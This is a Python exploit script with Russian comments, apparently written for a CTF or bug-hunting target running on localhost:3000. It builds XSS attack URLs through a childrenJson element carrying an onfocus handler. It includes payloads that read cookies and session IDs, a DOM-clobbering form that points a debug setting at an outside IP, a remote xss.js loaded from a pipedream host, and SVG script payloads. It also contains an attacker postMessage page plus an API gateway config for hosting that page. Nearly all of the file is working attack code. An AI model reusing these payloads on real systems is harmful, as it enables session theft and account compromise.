from urllib.parse import quote
from base64 import b64encode

# Функция для генерации JSON для children: <img src="1" onerror="PAYLOAD">
def generate_children_json(payload):
    if not payload:
        return None  # Если payload пустой, не добавляем childrenJson
    json_structure = {
        "type": "img",
        "props": {
            "autofocus": "1",  # Недействительный src, чтобы сработал onerror
            "onfocus": payload  # Здесь вставляется контролируемый payload
        },
        "children": None  # Нет вложенных элементов
    }
    import json
    json_str = json.dumps(json_structure, separators=(',', ':'))  # Компактный JSON без пробелов
    return quote(json_str)  # URL-кодируем для добавления в query string

base = "http://localhost:3000/"

# name = "embed"
# name = "script"
# name = "img"

# payload = "alert(1);"
# payload = "localStorage.getItem('sessionid');"
# payload = "fetch('http://localhost:3000/about', { credentials: 'include'});"
# payload += '''const form = document.createElement('form');
# form.id = 'config';
# form.innerHTML = `<input name="debug" value="http://217.19.4.141:8000" />`;
# document.body.appendChild(form);'''

# payload = "window.open('http://localhost:3000/about');"
# payload += '''const form = document.createElement('form');
# form.id = 'config';
# form.innerHTML = '<input name="debug" value="http://217.19.4.141:8000" />';
# document.body.appendChild(form);'''
payload = '''alert(document.cookie);'''
# payload = 'eval(atob("'+b64encode(payload.encode()).decode()+'"));'
# src = "data:text/javascript," + payload
# src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ0phdmFTY3JpcHQgZXhlY3V0ZWQgZnJvbSB3aXRoaW4gU1ZHIScpOzwvc2NyaXB0Pjwvc3ZnPg=='
# payload = '''
# window.open('http://localhost:3000/about');
# const form = document.createElement('form');
# form.id = 'config';
# form.innerHTML = `<input name="debug" value="http://217.19.4.141:8000" />`;
# document.body.appendChild(form);
# '''
# payload = 'window.open("http://localhost:3000/about", "_blank");'
# payload = "fetch('http://localhost:3000/asdasd');"

# payload = "fetch('http://localhost:3000/mobile-cookie-to-header', { credentials: 'include', mode: 'no-cors' });"

# src = "data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="
# src = "data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoZG9jdW1lbnQuY29va2llKTs8L3NjcmlwdD48L3N2Zz4="



# src= f'''<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss"><script type="text/ecmascript">{payload}</script></svg>'''
# src = 'data:image/svg+xml;base64,'+b64encode(src.encode()).decode()

# name = "script"
# src="https://eoikvczv5cff25f.m.pipedream.net/xss.js"


# Генерируем childrenJson и добавляем в URL
name = "input"
src = "1"
payload= "asd"
jsbin_p = f"<{name} src=\"{src}\">"

children_json_quoted = generate_children_json(payload)
url_p = f"{base}?name={quote(name)}&src={quote(src)}"
if children_json_quoted:
    url_p += f"&childrenJson={children_json_quoted}"

# print(jsbin_p)
print(url_p)


html_p='''
<iframe id="app" src="BASE"></iframe>

<script>
  window.open("http://localhost:3000/about", "_blank", "width=1,height=1,left=-1000,top=-1000");

  document.getElementById('app').onload = function() {
    setTimeout(() => {
      this.contentWindow.postMessage({
        type: 'SET_B2B_PARTNER_ICON',
        payload: {
          name: 'NAME',
          src: 'SRC'
        }
      }, '*');
    }, 100);
  };
</script>
'''.replace('BASE', base).replace('NAME', name).replace('SRC', src)
# html_p='''
# <script>
#   const newWindow = window.open("http://localhost:3000/about");
#   newWindow.addEventListener('load', () => {
#     newWindow.postMessage({
#       type: 'SET_B2B_PARTNER_ICON',
#       payload: { name: 'NAME', src: 'SRC' }
#     }, 'https://d5d04v3t472k3dki3oha.kf69zffa.apigw.yandexcloud.net');  // Укажи точный origin, не '*'
#   });
# </script>
# '''.replace('BASE', base).replace('NAME', name).replace('SRC', src)
# print(html_p)

openapi_p = '''openapi: 3.0.0
info:
  title: Sample API
  version: 1.0.0
servers:
- url: https://d5d04v3t472k3dki3oha.kf69zffa.apigw.yandexcloud.net
paths:
  /:
    get:
      x-yc-apigateway-integration:
        type: dummy
        content:
          '*': |
            <iframe id="app" src="BASE"></iframe>
            <script>
              document.getElementById('app').onload = function() {
                setTimeout(() => {
                  this.contentWindow.postMessage({
                    type: 'SET_B2B_PARTNER_ICON',
                    payload: {
                      name: 'NAME',
                      src: 'SRC'                    }
                  }, '*');
                }, 1000);
              };
            </script>
        http_code: 200
        http_headers:
          Content-Type: text/html; charset=utf-8'''.replace('BASE', base).replace('NAME', name).replace('SRC', src)

# print(openapi_p)
